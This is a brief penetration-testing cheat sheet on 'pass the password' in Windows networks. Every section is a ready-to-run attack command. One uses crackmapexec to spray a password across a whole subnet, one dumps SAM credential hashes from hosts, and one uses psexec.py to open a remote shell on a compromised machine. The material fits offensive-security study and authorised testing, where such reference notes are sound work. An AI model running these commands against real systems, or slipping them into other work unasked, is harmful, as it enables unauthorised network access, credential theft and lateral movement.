# Pass the Password

This will **spray the password** and **user** on the entire network.

```
crackmapexec smb 192.168.0.0/24 -u <user> -d <domain>-p Password1
```

Try to dump the **sam** file.

```
crackmapexec smb 192.168.0.0/24 -u <user> -d <domain>-p Password1 --sam
```

Try to get a shell in a machine that you have **"Pwned!!"**.

```
psexec.py <domain>/<user>:<password>@<IP>
```
